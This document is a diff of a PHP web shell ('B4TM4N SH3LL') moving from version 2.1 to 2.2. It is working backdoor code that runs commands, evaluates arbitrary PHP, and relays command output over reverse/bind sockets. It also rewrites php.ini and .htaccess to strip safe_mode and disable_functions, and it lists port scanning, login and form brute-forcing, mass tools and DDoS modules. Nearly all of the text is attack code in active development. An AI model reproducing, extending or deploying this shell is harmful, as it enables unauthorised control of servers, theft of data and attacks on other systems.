@@ -14,10 +14,10 @@
 */
 
 $config=[
-	"user"    => "zaIgxSRawZ==",                             // B64E('user')
-	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a", // sha1(md5('pass'))
-	"title"   => "B4TM4N SH3LL",                             // Title
-	"version" => "2.1",                                      // Version
+	"user"    => "zaIgxSRawZ==",                            // B64E('user')
+	"pass"    => "42b378d7eb719b4ad9c908601bdf290d541c9c3a",// sha1(md5('pass'))
+	"title"   => "B4TM4N SH3LL",                            // Title
+	"version" => "2.2",                                     // Version
 	"debug"   => true                                        // Debug Mode
 ];
 
@@ -226,7 +226,8 @@ $start=microtime(true); // Time Pageload
 	#php-configuration{text-align:center}
 
 	#update{text-align:center}
-	#process-list{padding:25px;margin:auto;width: 50%}
+	#process-list{padding:25px;margin:25px auto 0px;border:1px solid #111;overflow:scroll;overflow-y:hidden}
+	#process-list s{text-decoration:none}
 	
 	.tools-header{margin-bottom:20px;padding-bottom:25px;text-align:center;border-bottom:1px solid #111}
 
@@ -255,11 +256,16 @@ $start=microtime(true); // Time Pageload
 	label{display:inline-block;min-width:100px;}
 	iframe{background:#fff}
 
+	.auto-number table{counter-reset:row_}
+	.auto-number table tbody tr td:first-child{counter-increment:row_;vertical-align:middle;text-align:center}
+	.auto-number table tbody tr td:first-child::before{content:counter(row_)}
+
 	fieldset {border:1px solid #111;background:#000;color:lime;width:100%;padding:15px;box-sizing:border-box;min-height:154px}
 	textarea {border:1px solid #111;background:#000;color:lime;width:100%;padding:15px;min-height:300px;outline:none;box-sizing:border-box;resize:none}
 	input[type=submit]       {background:#111;border:1px solid #222;color:#fff;line-height:25px;padding:0 10px;cursor:pointer;outline:none}
 	input[type=submit]:hover {background:#222;border:1px solid #666}
-	input[type=text] {background:#000;color:lime;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}
+	input[type=text]  {background:#000;color:lime;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}
+	input[type=number]{background:#000;color:lime;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}
 	input[type=file] {background:#000;color:lime;border:1px solid #111;width:200px;padding:2px;outline:none;box-sizing:border-box}
 	select           {background:#000;color:lime;border:1px solid #111;width:200px;padding:5px;outline:none;box-sizing:border-box}
 
@@ -612,6 +618,58 @@ function GetUrlFromPath($x)
 	return $protocol.server_name.$path;
 }
 
+function PostUrlContent($url,$content)
+{
+	global $userAgent;
+
+	$params=array(
+		'http' => array(
+			'method'  => "POST",
+			'header'  => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: $userAgent\r\n",
+			'content' => http_build_query($content)
+		)
+	);
+
+	$results="";
+
+	$context=stream_context_create($params);
+
+	if($http=substr(get_headers($url)[0],9,3) != "200")
+	{
+	    $results="Error: $http";
+	}
+	else
+	{
+		//file_get_contents
+	    if($contents=file_get_contents($url,null,$context))
+		{
+			$results=htmlspecialchars($contents);
+		}
+
+		//stream_get_contents
+		if($handle=fopen($url,'r',false,$context)) 
+		{
+		    $contents=stream_get_contents($handle);
+		    fclose($handle);
+		    $results=htmlspecialchars($contents);
+		}
+
+		//fopen
+		if($handle=fopen($url,'r',false,$context))
+		{
+			$contents="";
+			while(!feof($handle)) 
+			{
+				$contents.=fread($handle,10240);
+			}
+			fclose($handle);
+			$results=htmlspecialchars($contents);
+		}
+
+	}
+	return $results;
+}
+
 function GetFileType($x) 
 {
 	if(is_file($x)) 
@@ -653,20 +711,15 @@ function GetFilePerm($x)
 {
 	$perms=@fileperms($x);
 	switch ($perms & 0xF000) 
-	{
-	    case 0xC000:$info='s';break;case 0xA000:$info='l';break;
-	    case 0x8000:$info='r';break;case 0x6000:$info='b';break;
-	    case 0x4000:$info='d';break;case 0x2000:$info='c';break;
-	    case 0x1000:$info='p';break;default:$info='u';
-	}
-	$info .=(($perms & 0x0100)?'r':'-');
-	$info .=(($perms & 0x0080)?'w':'-');
+	{case 0xC000:$info='s';break;case 0xA000:$info='l';break;
+    case 0x8000:$info='r';break;case 0x6000:$info='b';break;
+    case 0x4000:$info='d';break;case 0x2000:$info='c';break;
+    case 0x1000:$info='p';break;default:$info='u';}
+	$info .=(($perms & 0x0100)?'r':'-');$info .=(($perms & 0x0080)?'w':'-');
 	$info .=(($perms & 0x0040)?(($perms & 0x0800)?'s':'x' ):(($perms & 0x0800)?'S':'-'));
-	$info .=(($perms & 0x0020)?'r':'-');
-	$info .=(($perms & 0x0010)?'w':'-');
+	$info .=(($perms & 0x0020)?'r':'-');$info .=(($perms & 0x0010)?'w':'-');
 	$info .=(($perms & 0x0008)?(($perms & 0x0400)?'s':'x' ):(($perms & 0x0400)?'S':'-'));
-	$info .=(($perms & 0x0004)?'r':'-');
-	$info .=(($perms & 0x0002)?'w':'-');
+	$info .=(($perms & 0x0004)?'r':'-');$info .=(($perms & 0x0002)?'w':'-');
 	$info .=(($perms & 0x0001)?(($perms & 0x0200)?'t':'x' ):(($perms & 0x0200)?'T':'-'));
 	return sprintf('%s [%s]',$info,substr(decoct($perms),2));
 }
@@ -728,7 +781,7 @@ function GetFileOwnerGroup($x)
 		{
 			$user=posix_getpwuid(fileowner($x));
 			$group=posix_getgrgid(filegroup($x));
-			return sprintf('%s(%s)/%s(%s)',$user['name'], $user['uid'],$group['name'],$group['gid']);
+			return sprintf('%s(%s)/%s(%s)',$user['name'],$user['uid'],$group['name'],$group['gid']);
 		}
 	}
 	return "?(?)/?(?)";
@@ -1214,7 +1267,7 @@ if(any("r",$_REQUEST))
 			}
 			else
 			{
-				$_SESSION['status']="Whoops, something went wrong...";
+				$_SESSION['status']="Whoops,something went wrong...";
 			}
 			header("location:".php_self."?a=e&r=".urle($file));
 		}
@@ -1236,7 +1289,7 @@ if(any("r",$_REQUEST))
 			$newname=$path['dirname']._.trim($_REQUEST['name']);
 			if(!rename(trim($file),$newname)) 
 			{
-			    $_SESSION['status']='Whoops, something went wrong...';
+			    $_SESSION['status']='Whoops,something went wrong...';
 			} 
 			else 
 			{
@@ -1261,7 +1314,7 @@ if(any("r",$_REQUEST))
 			$octal=octdec($_REQUEST['octal']);
 			if(!chmod(trim($file),$octal)) 
 			{
-			    $_SESSION['status']='Whoops, something went wrong...';
+			    $_SESSION['status']='Whoops,something went wrong...';
 			} 
 			else 
 			{
@@ -1293,7 +1346,7 @@ if(any("r",$_REQUEST))
 			$own=$_REQUEST['own'];
 			if(!chown(trim($file),$own)) 
 			{
-			    $_SESSION['status']='Whoops, something went wrong...';
+			    $_SESSION['status']='Whoops,something went wrong...';
 			} 
 			else 
 			{
@@ -1325,7 +1378,7 @@ if(any("r",$_REQUEST))
 			$grp=$_REQUEST['grp'];
 			if(!chgrp(trim($file),$grp)) 
 			{
-				$_SESSION['status']='Whoops, something went wrong...';
+				$_SESSION['status']='Whoops,something went wrong...';
 			} 
 			else 
 			{
@@ -1350,7 +1403,7 @@ if(any("r",$_REQUEST))
 			$time=$_REQUEST['time'];
 			if(!touch(trim($file),strtotime($time))) 
 			{
-			    $_SESSION['status']='Whoops, something went wrong...';
+			    $_SESSION['status']='Whoops,something went wrong...';
 			} 
 			else 
 			{
@@ -1479,7 +1532,7 @@ if(any("r",$_REQUEST))
 				{
 					if(!copy(trim($source),trim($dest))) 
 					{
-					    $_SESSION['status']='Whoops, cannot copying...';
+					    $_SESSION['status']='Whoops,cannot copying...';
 					} 
 					else 
 					{
@@ -1490,7 +1543,7 @@ if(any("r",$_REQUEST))
 				{
 					if(!copy(trim($source),trim($dest))) 
 					{
-					    $_SESSION['status']='Whoops, cannot moving...';
+					    $_SESSION['status']='Whoops,cannot moving...';
 					} 
 					else 
 					{
@@ -1501,14 +1554,14 @@ if(any("r",$_REQUEST))
 					   }
 					    else
 					    {
-					    	$_SESSION['status']='Whoops, just copying...';
+					    	$_SESSION['status']='Whoops,just copying...';
 					   }
 					}
 				}
 			}
 			else
 			{
-				$_SESSION['status']="Whoops, File was Exists <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
+				$_SESSION['status']="Whoops,File was Exists <a href=?a=v&r='" . urle($dest) . "'>'" . basename($dest) . "'</a>";
 			}
 
 			if($_REQUEST['a']=='cp')
@@ -1563,62 +1616,80 @@ if(any("x",$_REQUEST))
 	if($_REQUEST['x']=="secure")
 	{
 		$disable_functions=array_filter(array_map('trim',explode(',',ini_get("disable_functions"))));
-		$security=['show_source','mysql_list_dbs','openlog','syslog','apache_child_terminate','apache_setenv',
-					'apache_getenv','apache_note','exec','system','passthru','shell_exec','escapeshellarg',
-					'escapeshellcmd','virtual','mb_send_mail','proc_close','proc_open','ini_alter','dl',
-					'popen','pcntl_exec','socket_accept','socket_bind','socket_clear_error','socket_close',
-					'socket_connect','socket_create_listen','socket_create_pair','socket_create',
-					'socket_get_option','socket_getpeername','socket_getsockname','socket_last_error',
-					'socket_listen','socket_read','socket_recv','socket_recvfrom','socket_select',
-					'socket_send','socket_sendto','socket_set_block','socket_set_nonblock',
-					'socket_set_option','socket_shutdown','socket_strerror','socket_write',
-					'stream_socket_server','pfsockopen','disk_total_space','disk_free_space',
-					'diskfreespace','chown','getrusage','get_current_user','set_time_limit',
-					'leak','listen','chgrp','link','symlink','dlopen','proc_nice','proc_get_stats',
-					'proc_terminate','sh2_exec','posix_getpwuid','posix_getgrgid','posix_kill',
-					'ini_restore','mkfifo','dbmopen','dbase_open','filepro','filepro_rowcount',
-					'posix_mkfifo','_xyec','mainwork','get_num_redirects','putenv','geoip_open','sleep'];
 
+		$security=['_xyec','allow_url_fopen','allow_url_include','apache_child_terminate','apache_get_modules',
+		'apache_getenv','apache_note','apache_setenv','chdir','chgrp','chmod','chown','curl_exec','curl_multi_exec',
+		'dbase_open','dbmopen','define_syslog_variables','disk_free_space','disk_total_space','diskfreespace','dl',
+		'dlopen','escapeshellarg','escapeshellcmd','eval','exec','extract','filepro','filepro_rowcount',
+		'filepro_retrieve','fopen_with_path','fp','fputs','ftp_connect','ftp_exec','ftp_get','ftp_login','ftp_nb_fput',
+		'ftp_put','ftp_raw','ftp_rawlist','geoip_open','get_cfg_var','get_current_user','get_num_redirects','getcwd',
+		'getenv','getlastmo','getmygid','getmyinode','getmypid','getmyuid','getrusage','highlight_file','ini_alter',
+		'ini_get_all','ini_restore','ini_set','inject_code','leak','link','listen','mainwork','mb_send_mail','mkdir',
+		'mkfifo','move_uploaded_file','mysql_list_dbs','mysql_pconnect','openlog','parse_ini_file','passthru',
+		'pcntl_alarm','pcntl_exec','pcntl_fork','pcntl_get_last_error','pcntl_getpriority','pcntl_setpriority',
+		'pcntl_signal','pcntl_signal_dispatch','pcntl_sigprocmask','pcntl_sigtimedwait','pcntl_sigwaitinfo',
+		'pcntl_strerrorp','pcntl_wait','pcntl_waitpid','pcntl_wexitstatus','pcntl_wifexited','pcntl_wifsignaled',
+		'pcntl_wifstopped','pcntl_wstopsig','pcntl_wtermsig','pfsockopen','phpAds_XmlRpc','phpAds_remoteInfo',
+		'phpAds_xmlrpcDecode','phpAds_xmlrpcEncode','php_uname','phpinfo','popen','posix_getgrgid','posix_getlogin',
+		'posix_getpwuid','posix_kill','posix_mkfifo','posix_setpgid','posix_setsid','posix_setuid','posix_ttyname',
+		'posix_uname','posixc','proc_close','proc_get_stats','proc_get_status','proc_nice','proc_open','proc_terminate',
+		'ps_aux','putenv','readlink','rename','runkit_function_rename','rmdir','set_time_limit','sh2_exec','shell_exec',
+		'show_source','sleep','socket_accept','socket_bind','socket_clear_error','socket_close','socket_connect',
+		'socket_create','socket_create_listen','socket_create_pair','socket_get_option','socket_getpeername',
+		'socket_getsockname','socket_last_error','socket_listen','socket_read','socket_recv','socket_recvfrom',
+		'socket_select','socket_send','socket_sendto','socket_set_block','socket_set_nonblock','socket_set_option',
+		'socket_shutdown','socket_strerror','socket_write','stream_select','stream_socket_server','symlink','syslog',
+		'system','virtual','xmlrpc_entity_decode'];
+
+		sort($security);
 		$fucks=array_unique(array_merge($disable_functions,$security));
 		$table="";
-		$no=1;
 		$enable=0;
 		$disable=0;
 		$total=count($fucks);
 		foreach($fucks as $fuck) 
 		{
-			$table.="<tr><td>$no</td><td>$fuck</td><td>";
+			$table.="<tr><td></td><td>$fuck</td><td>";
 			if(in_array($fuck,$disable_functions))
 			{
+				$table.="<center><font color=red>DIE</font></center>";
 				$disable++;
-				$table.="<font color=red>DIE</font>";
 			}
 			else
 			{
-				$enable++;
-				$table.="<center><font color=white>READY</font></center>";
+				if(function_exists($fuck)||is_callable($fuck))
+				{
+					$table.="<center><font color=white>READY</font></center>";
+					$enable++;
+				}
+				else
+				{
+					$table.="<center><font color=orange>OFF</font></center>";
+					$disable++;
+				}
 			}
 			$table.="</td></tr>";
-			$no++;
 		}
 
 		$risk=($enable / $total) * 100;
 		$secure=($disable / $total) * 100;
 
-		printf("<h2 style='text-align:center'>Sec. Info V1.0.%s</h2><br>
+		printf("<h2 style='text-align:center'>Sec. Info V1.1.%s</h2><br>
 			<h4 style='text-align:center;color:white'>Risks Rate <font color=red>[%s%%]</font> | Secure Rate <font color=lime>[%s%%]</font></h4><br><br>
-			<table class='table'>
-				<thead>
-					<tr>
-						<th width='15'>No.</th>
-						<th>Disable Function</th>
-						<th>Status</th>
-					</tr>
-				</thead>
-				<tbody>
-					%s
-				</tbody>
-			</table>",$total,round($risk,2),round($secure,2),$table);
+			<div class='auto-number'>
+				<table class='table sortable'>
+					<thead>
+						<tr>
+							<th class='sorttable_nosort' width='15'>No.</th>
+							<th>Disable Function</th>
+							<th>Status</th>
+						</tr>
+					</thead>
+					<tbody>
+						%s
+					</tbody>
+				</table>
+			</div>",$total,round($risk,2),round($secure,2),$table);
 	}
 	if($_REQUEST['x']=="info")
 	{
@@ -1696,7 +1767,7 @@ if(any("x",$_REQUEST))
 			$process="";
 			$sql=mysql_connect($_SESSION['host'],$_SESSION['user'],$_SESSION['pass']);
 			$result=mysql_list_processes($sql);
-			while ($row=mysql_fetch_assoc($result))
+			while($row=mysql_fetch_assoc($result))
 			{
 			    $process.=sprintf("<tr>
 			    	<td>%s</td>
@@ -1804,28 +1875,28 @@ if(any("x",$_REQUEST))
 
 			if ($data!==false)
 			{
-				echo "<table class='table'>";
+				print "<table class='table'>";
 				foreach($data as $key => $val)
 				{
 					if(is_array($val))
 					{
-						echo "<tr>";
+						print "<tr>";
 						foreach($val as $key2 => $val2)
 						{
 							if(!is_array($val2))
 							{
-								echo "<td>".$val2."</td>";
+								print "<td>".$val2."</td>";
 							}
 						}
-						echo "</tr>";
+						print "</tr>";
 					}
 					
 				}
-				echo "</table>";
+				print "</table>";
 			}
 			else
 			{
-				echo '<span class=off>Query not Executed</span>';
+				print '<span class=off>Query not Executed</span>';
 			}
 		}
 
@@ -1933,7 +2004,7 @@ if(any("x",$_REQUEST))
 				$charset='Windows-1251';
 			}
 			$ret=iconv($charset,'UTF-8',Execute($command));
-			echo html_entity_decode($ret);
+			print $ret;
 			exit;
 		}
 		elseif(any("xa",$_REQUEST)&&$_REQUEST['xa']=="terminals-curdir")
@@ -1957,7 +2028,7 @@ if(any("x",$_REQUEST))
 				}
 			}
 			$_SESSION['curdir']=$dir;
-			echo '$ '.$dir.':';
+			print '$ '.$dir.':';
 			exit;
 		}
 	}
@@ -2013,7 +2084,7 @@ if(any("x",$_REQUEST))
 					    	printf($command);
 					    	exit;
 					   }
-				        fwrite($sock,Execute($command));
+				       fwrite($sock,Execute($command));
 				   }
 				    fclose($sock);
 				}
@@ -2041,7 +2112,7 @@ if(any("x",$_REQUEST))
 					    	printf($input);
 					    	exit;
 					   }
-					    @socket_write($sock,Execute($input),strlen (Execute($input)));
+					   @socket_write($sock,Execute($input),strlen (Execute($input)));
 					}
 					socket_set_block($sock);
 					socket_close($sock);
@@ -2078,44 +2149,37 @@ if(any("x",$_REQUEST))
 	}
 	if($_REQUEST['x']=="htaccess")
 	{
-		$php_ini="upload_max_filesize=40M\npost_max_size=40M\nsafe_mode=Off\ndisable_functions =\nsafe_mode_gid=Off\nopen_basedir=Off\nregister_globals=on\nexec=On\nshell_exec=On";
-		$htaccess="Options All\nAllow from all\nSatisfy Any";
+		$php_ini="upload_max_filesize=32M\npost_max_size=32M\nsafe_mode=Off\ndisable_functions =\nsafe_mode_gid=Off\nopen_basedir=Off\nregister_globals=on\nexec=On\nshell_exec=On";
+		$htaccess="Options All\nAllow From All\nSatisfy Any";
 
 		print "Coming Soon";
 	}
 	if($_REQUEST['x']=="php")
 	{	
-		$evil="";
+		$exp="print_r(get_extension_funcs('Core'));\nprint_r(get_loaded_extensions());\nprint_r(ini_get_all('pcre'));\nprint_r(ini_get_all());\nprint_r(get_defined_constants());\nprint_r(get_defined_functions());\nprint_r(get_declared_classes());";
+		
 		printf("<div id='php'>
 					<form onsubmit='return false;'>
 						<div class='php-left'>
-							<textarea id='php-code' cols='122' rows='20'>
-							print_r(get_extension_funcs('Core'));
-							print_r(get_loaded_extensions());
-							print_r(ini_get_all('pcre'));
-							print_r(ini_get_all());
-							print_r(get_defined_constants());
-							print_r(get_defined_functions());
-							print_r(get_declared_classes());
-							</textarea>
+							<textarea id='php-code' cols='122' rows='20'>%s</textarea>
 						</div>
 						<div class='php-right'>
-							<textarea id='php-eval' cols='122' rows='20' readonly>%s</textarea>
+							<textarea id='php-eval' cols='122' rows='20' readonly></textarea>
 						</div>
 						<input type='submit' id='php-submit' onclick=\"getAjax(false,'php-eval','POST','?x=php&code='+document.getElementById('php-code').value);\" class='php-code' name=php-code cols=122 rows=20 value=Run />
 					</form>
-				</div>",$evil);
+				</div>",$exp);
 
 		if(any("code",$_REQUEST))
 		{
 			ob_clean();
-			$evil=Evil($_REQUEST['code']);
+			$evil=Evil(trim($_REQUEST['code']));
 			exit;
 		}
 	}
 	if($_REQUEST['x']=="perl")
 	{
-		echo 'PHP Perl Class: '.(class_exists('Perl')?"<b class='on'>ON</b>":"<b class='off'>OFF</b>").'<br>';
+		print 'PHP Perl Class: '.(class_exists('Perl')?"<b class='on'>ON</b>":"<b class='off'>OFF</b>").'<br>';
 
 		if(Unix())
 		{
@@ -2221,6 +2285,7 @@ if(any("x",$_REQUEST))
 		$headers[]='Bcc:birthdaycheck@example.com';
 
 		$send_mail=mail($to,$subject,$message,implode("\r\n",$headers));
+
 		var_dump($send_mail);
 	}
 	if($_REQUEST['x']=='process')
@@ -2241,25 +2306,25 @@ if(any("x",$_REQUEST))
 			{
 				$kill=Execute("kill 9 $pid");
 				$kill=Execute("kill 9 $name");
-				if($kill) echo '<font class="off">Process Killed</font>';
+				if($kill) print '<font class="off">Process Killed</font>';
 			}
 			else
 			{
 				$kill=Execute("taskkill /f /pid $pid");
 				$kill=Execute("taskkill /f /im $name");
-				if($kill) echo '<font class="off">Process Killed</font>';
+				if($kill) print '<font class="off">Process Killed</font>';
 			}
 		}
 
 		if(Unix())
 		{
 			$ret=iconv('UTF-8','UTF-8',Execute('ps aux | less'));
-			echo '<div id="process-list"><pre>'.html_entity_decode($ret).'</pre></div>';
+			print '<div id="process-list"><pre>'.$ret.'</pre></div>';
 		}
 		else
 		{
 			$ret=iconv('Windows-1251','UTF-8',Execute('tasklist'));
-			echo '<div id="process-list"><pre>'.html_entity_decode($ret).'</pre></div>';
+			print '<div id="process-list"><pre>'.$ret.'</pre></div>';
 		}
 	}
 	if($_REQUEST['x']=='shells')
@@ -2404,11 +2469,11 @@ if(any("x",$_REQUEST))
 							$fail++;
 						}
 					}
-					echo "Success: $succ | Failed: $fail";
+					print "Success: $succ | Failed: $fail";
 				}
 				else
 				{
-					echo "Target not exists !";
+					print "Target not exists !";
 				}
 			}
 
@@ -2427,11 +2492,11 @@ if(any("x",$_REQUEST))
 							$fail++;
 						}
 					}
-					echo "Success: $succ | Failed: $fail";
+					print "Success: $succ | Failed: $fail";
 				}
 				else
 				{
-					echo "Target not exists !";
+					print "Target not exists !";
 				}
 			}
 
@@ -2448,16 +2513,16 @@ if(any("x",$_REQUEST))
 						$fail++;
 					}
 				}
-				echo "Success: $succ | Failed: $fail";
+				print "Success: $succ | Failed: $fail";
 			}
 
 			if($_REQUEST['action-option']=='zip')
 			{
 				if(end(explode(".",$newloc))=='zip')
 				{
-					$zip = new ZipArchive;
+					$zip=new ZipArchive;
 
-					if ($zip->open($newloc,ZipArchive::CREATE|ZipArchive::OVERWRITE) === TRUE) 
+					if ($zip->open($newloc,ZipArchive::CREATE|ZipArchive::OVERWRITE)===TRUE) 
 					{
 						foreach($files as $file)
 						{
@@ -2465,7 +2530,7 @@ if(any("x",$_REQUEST))
 							{
 								$zip->addEmptyDir(basename($file));
 
-								$recur = new RecursiveIteratorIterator(
+								$recur=new RecursiveIteratorIterator(
 								    new RecursiveDirectoryIterator($file),
 								    RecursiveIteratorIterator::LEAVES_ONLY 
 								);
@@ -2489,21 +2554,21 @@ if(any("x",$_REQUEST))
 							}
 							elseif(is_file($file))
 							{
-								$zip->addFile($file, basename($file));
+								$zip->addFile($file,basename($file));
 							}
 						}
 
 					    $zip->close();
-					    echo 'Zip Created';
+					    print 'Zip Created';
 					} 
 					else 
 					{
-					    echo 'Failed';
+					    print 'Failed';
 					}
 				}
 				else
 				{
-					echo 'Extension must Zip';
+					print 'Extension must Zip';
 				}
 			}
 
@@ -2515,9 +2580,9 @@ if(any("x",$_REQUEST))
 					{
 						if(end(explode(".",$file))=='zip')
 						{
-							$zip = new ZipArchive;
+							$zip=new ZipArchive;
 					
-							if ($zip->open($file) === TRUE) 
+							if ($zip->open($file)===TRUE) 
 							{
 							    $zip->extractTo($newloc);
 							    $zip->close();
@@ -2534,18 +2599,18 @@ if(any("x",$_REQUEST))
 						}
 						
 					}
-					echo "Success: $succ | Failed: $fail";
+					print "Success: $succ | Failed: $fail";
 				}
 				else
 				{
-					echo "Target not exists !";
+					print "Target not exists !";
 				}
 			}
 		}
 	}
 	if($_REQUEST['x']=="find")
 	{
-		$recur = new RecursiveIteratorIterator(
+		$recur=new RecursiveIteratorIterator(
 		    new RecursiveDirectoryIterator($dir),
 		    RecursiveIteratorIterator::LEAVES_ONLY 
 		);
@@ -2554,7 +2619,6 @@ if(any("x",$_REQUEST))
 		{
 			$result="";
 			$res_=0;
-			$no=1;
 
 			foreach ($recur as $key => $val) 
 			{
@@ -2563,12 +2627,11 @@ if(any("x",$_REQUEST))
 					if(strpos(realpath($key),$_REQUEST['find-value'])!== false) 
 					{
 						$result.=sprintf("<tr>
-								<td><center>%d</center></td>
+								<td></td>
 								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
 								<td><a href='?g=%s' title='%s' target='_blank'>%s</a></td>
 								<td><center>%s</center></td>
 								</tr>",
-								$no++,
 								substr(realpath($key),0,strrpos(realpath($key),_)),
 								substr(realpath($key),0,strrpos(realpath($key),_)),
 								substr(realpath($key),0,strrpos(realpath($key),_)),
@@ -2584,32 +2647,33 @@ if(any("x",$_REQUEST))
 			}
 
 			printf("<label>Find: '%s' | Found's: %s</label>
-					<table class='table sortable'>
-						<thead>
-							<tr>
-								<th>No.</th>
-								<th>Directory</th>
-								<th>Filename</th>
-								<th>Modified</th>
-							</tr>
-						<tbody>%s</tbody>
-					</table>",$_REQUEST['find-value'],$res_,$result);
-
+					<div class='auto-number'>
+						<table class='table sortable'>
+							<thead>
+								<tr>
+									<th class='sorttable_nosort' width='15'>No.</th>
+									<th>Directory</th>
+									<th>Filename</th>
+									<th>Modified</th>
+								</tr>
+							<tbody>%s</tbody>
+						</table>
+					</div>",$_REQUEST['find-value'],$res_,$result);
 		}
 		else
 		{
-			echo 'Whoops, Nothing Find !';
+			print '<font color="red">Whoops,Nothing Find !</font>';
 		}
 	}
 	if($_REQUEST['x']=="update")
 	{
 		$link_update='https://raw.githubusercontent.com/k4mpr3t/b4tm4n/master/bat.php';
-		$current_version=2.1; //Sensitive Case Variable
+		$current_version=2.2; //Sensitive Case Variable
 
 		if($config['debug']==true)
 		{
 			$git_script=htmlentities(file_get_contents(__FILE__));
-			$latest_version=$current_version-0.1; //Test Update latest version -/+ 0.1
+			$latest_version=$current_version+0.1; //Test Update latest version -/+ 0.1
 		}
 		else
 		{
@@ -2623,7 +2687,7 @@ if(any("x",$_REQUEST))
 		{
 			if($config['debug']==true)
 			{
-				$status.='New Version Available<br>Setting Debug to False for Activate this Feature';
+				$status.='New Version Available '.$latest_version.'<br>Setting Debug to False for Activate this Feature';
 			}
 			else
 			{
@@ -2636,7 +2700,7 @@ if(any("x",$_REQUEST))
 		}
 
 		Printf("<div id='update'>
-					<a href='https://www.gnu.org/licenses/gpl-3.0.txt' target='_blank'>
+					<a href='https://www.gnu.org/licenses/gpl-3.0.txt' target='_blank' title='License'>
 						<img src='https://www.gnu.org/graphics/lgplv3-88x31.png'/>
 					</a><br><br>%s
 				</div>",$status);
@@ -2648,18 +2712,18 @@ if(any("z",$_REQUEST))
 {
 	$z=$_REQUEST['z'];
 
-	echo MenuTools([
-		"target-map"=>["title"=>"Target Map","ver"=>"1.0","auth"=>"k4mpr3t"],
-		"port-scanner"=>["title"=>"Scan Port","ver"=>"1.0","auth"=>"k4mpr3t"],
-		"script-loader"=>["title"=>"Script Loader","ver"=>"1.0","auth"=>"k4mpr3t"],
-		"encryptor"=>["title"=>"Encryptor","ver"=>"1.0","auth"=>"k4mpr3t"],
-		"frmail-bruteforces"=>["title"=>"Form Email Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
-		"login-bruteforces"=>["title"=>"Login Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
-		"mass-tools"=>["title"=>"Mass Tools","ver"=>"1.0","auth"=>"k4mpr3t"],
-		"ddos-attack"=>["title"=>"DDOS Attack","ver"=>"1.0","auth"=>"k4mpr3t"],
+	print MenuTools([
+	"target-map"=>["title"=>"Target Map","ver"=>"1.0","auth"=>"k4mpr3t"],
+	"port-scanner"=>["title"=>"Scan Port","ver"=>"1.0","auth"=>"k4mpr3t"],
+	"script-loader"=>["title"=>"Script Loader","ver"=>"1.0","auth"=>"k4mpr3t"],
+	"encryptor"=>["title"=>"Encryptor","ver"=>"1.0","auth"=>"k4mpr3t"],
+	"form-bruteforces"=>["title"=>"Form Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
+	"login-bruteforces"=>["title"=>"Login Bruteforces","ver"=>"1.0","auth"=>"k4mpr3t"],
+	"mass-tools"=>["title"=>"Mass Tools","ver"=>"1.0","auth"=>"k4mpr3t"],
+	"ddos-attack"=>["title"=>"DDOS Attack","ver"=>"1.0","auth"=>"k4mpr3t"],
 	]);
 
-	echo "<div id='tools'>";
+	print "<div id='tools'>";
 
 	if(empty($z))
 	{
@@ -2670,7 +2734,7 @@ if(any("z",$_REQUEST))
 	}
 	if($z=="target-map")
 	{
-		echo "<div class='tools-header'>
+		print "<div class='tools-header'>
 				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
 				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
 			  </div>";
@@ -2699,7 +2763,7 @@ if(any("z",$_REQUEST))
 			$geoip=GetUrlContent($url);
 			$json=json_decode($geoip,true);
 			$url=sprintf(B64D("zSI9xSN3Ob0gBCYaOnwey7whAH4kwX0gBCYa")."?q=%s,%s&z=10&output=embed",$json['latitude'],$json['longitude']);
-			printf("<h3 align='center'><font class='on'>%s (%s) | %s, %s</font></h3><br>
+			printf("<h3 align='center'><font class='on'>%s (%s) | %s,%s</font></h3><br>
 					<iframe src='%s' width='100%%' height='345' frameBorder='0'><iframe>",
 					$json['country_name'],
 					$json['country_code'],
@@ -2711,7 +2775,7 @@ if(any("z",$_REQUEST))
 	}
 	if($z=="port-scanner")
 	{
-		echo "<div class='tools-header'>
+		print "<div class='tools-header'>
 				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
 				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
 			  </div>";
@@ -2743,10 +2807,10 @@ if(any("z",$_REQUEST))
 						$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP); 
 						for($conn_port=$from;$conn_port <=$to;$conn_port++)
 						{
-							$conn=@socket_connect($socket ,$host, $conn_port);
+							$conn=@socket_connect($socket ,$host,$conn_port);
 							if($conn) 
 							{ 
-								echo "<br>port $conn_port open";
+								print "<br>port $conn_port open";
 								socket_close($socket);
 								$socket=@socket_create(AF_INET ,SOCK_STREAM ,SOL_TCP);
 							}
@@ -2754,7 +2818,7 @@ if(any("z",$_REQUEST))
 					}
 					else
 					{
-						echo "Error socket_connect<br>";
+						print "Error socket_connect<br>";
 					}
 				break;
 				case '2':
@@ -2763,19 +2827,19 @@ if(any("z",$_REQUEST))
 						$conn=@fsockopen($host,$conn_port);
 						if($conn)
 						{
-							echo "<br>port $conn_port open";
+							print "<br>port $conn_port open";
 							fclose($conn);
 						}
 					}
 				break;
 			}
-			echo "<br>Scan Finish.";
+			print "<br>Scan Finish.";
 			exit;
 		}
 	}
 	if($z=="script-loader")
 	{
-		echo "<div class='tools-header'>
+		print "<div class='tools-header'>
 				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
 				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
 			  </div>";
@@ -2806,20 +2870,20 @@ if(any("z",$_REQUEST))
 				}
 				else
 				{
-					echo "<br>Failed";
+					print "<br>Failed";
 				}
-				echo "<br>Finish";
+				print "<br>Finish";
 			}
 			else
 			{
-				echo "<br>Mistakes";
+				print "<br>Mistakes";
 			}
 			exit;
 		}
 	}
 	if($z=="encryptor")
 	{
-		echo "<div class='tools-header'>
+		print "<div class='tools-header'>
 				  <h3>".$menu_tools[$z]['title']." v".$menu_tools[$z]['ver']."</h3>
 				  <h3> by: ".$menu_tools[$z]['auth']."</h3>
